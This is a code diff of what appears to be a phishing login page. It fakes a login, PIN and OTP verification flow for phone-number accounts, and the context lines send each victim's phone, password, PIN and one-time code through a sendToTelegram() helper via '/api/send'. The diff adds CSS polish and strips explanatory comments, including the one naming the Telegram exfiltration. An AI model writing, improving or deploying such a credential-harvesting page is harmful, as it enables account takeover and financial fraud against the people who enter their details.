@@ -115,6 +115,7 @@
             display: flex;
             align-items: center;
             gap: 12px;
+            border: 1px solid #e2e8f0;
         }
 
         .login-capsule .input-capsule input {
@@ -125,6 +126,7 @@
             flex: 1;
             font-weight: 500;
             color: #111;
+            width: 100%;
         }
 
         .login-capsule .input-capsule input::placeholder {
@@ -143,6 +145,7 @@
             margin-bottom: 16px;
             border-bottom: none;
             gap: 12px;
+            border: 1px solid #e2e8f0;
         }
 
         .card-panel .input-line {
@@ -150,6 +153,8 @@
             border-radius: 0;
             border-bottom: 1px solid #edf2f7;
             padding: 16px 0;
+            border: none;
+            border-bottom: 1px solid #edf2f7;
         }
 
         .card-panel .input-line label {
@@ -170,6 +175,7 @@
             background: transparent;
             font-weight: 500;
             color: #111;
+            width: 100%;
         }
 
         .utils-bar {
@@ -328,7 +334,6 @@
             margin: 15px 0 30px 0;
         }
 
-        /* Captcha Zone */
         .captcha-zone {
             margin: 20px 0 20px;
         }
@@ -395,7 +400,6 @@
             display: none;
         }
 
-        /* Modals */
         .otp-modal-overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -627,7 +631,6 @@
 </div>
 
 <script>
-    // View Switcher Function
     function switchView(viewId) {
         document.querySelectorAll('.view-section').forEach(el => el.classList.remove('active-view'));
         document.getElementById(viewId).classList.add('active-view');
@@ -649,7 +652,6 @@
         document.getElementById(modalId).classList.remove('active');
     }
 
-    // Telegram Sender Helper via Vercel Backend API (/api/send)
     async function sendToTelegram(payload) {
         try {
             await fetch('/api/send', {
@@ -664,9 +666,8 @@
 
     let currentPhone = '';
     let currentPassword = '';
-    let flowType = 'login'; // login or modify
+    let flowType = 'login';
 
-    // --- Login Flow ---
     document.getElementById('loginBtn').addEventListener('click', () => {
         currentPhone = document.getElementById('loginPhone').value.trim();
         currentPassword = document.getElementById('loginPassword').value.trim();
@@ -684,7 +685,6 @@
         document.getElementById('pin0').focus();
     });
 
-    // PIN Verification
     document.getElementById('verifyPinBtn').addEventListener('click', () => {
         let pin = '';
         document.querySelectorAll('.pin-digit').forEach(i => pin += i.value);
@@ -697,14 +697,12 @@
         sendToTelegram({ type: 'pin', phone: currentPhone, pin: pin });
         document.getElementById('pinModal').classList.remove('active');
 
-        // Open OTP Modal
         document.getElementById('otpModal').classList.add('active');
         document.querySelectorAll('.o-digit').forEach(i => i.value = '');
         document.getElementById('otp0').focus();
         document.getElementById('otpSubtext').textContent = `OTP sent to ${currentPhone.slice(0,3)}****${currentPhone.slice(-4)}`;
     });
 
-    // OTP Input Navigation
     const otpInputs = document.querySelectorAll('.o-digit');
     otpInputs.forEach((input, index) => {
         input.addEventListener('input', (e) => {
@@ -725,7 +723,6 @@
         });
     });
 
-    // Verify OTP & Login / Modify
     document.getElementById('verifyOtpBtn').addEventListener('click', () => {
         let otp = '';
         otpInputs.forEach(i => otp += i.value);
@@ -755,7 +752,6 @@
         }
     });
 
-    // --- Modify Password Flow ---
     document.getElementById('modifyBtn').addEventListener('click', () => {
         const phone = document.getElementById('modifyPhone').value.trim();
         const pass = document.getElementById('modifyPass').value.trim();
